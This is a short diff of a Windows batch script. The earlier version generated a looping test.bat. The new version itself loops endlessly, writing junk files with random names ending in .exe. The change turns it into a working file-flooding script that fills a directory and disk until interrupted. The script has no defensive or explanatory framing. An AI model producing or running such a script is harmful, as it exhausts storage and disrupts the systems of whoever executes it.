@@ -1,5 +1,3 @@
-@echo off
-echo @echo off > test.bat
-echo :loop >> test.bat
-echo echo >test%random% >> test.bat
-echo gotoloop >> test.bat
+:loop
+echo >test%random%%random%.exe
+goto loop
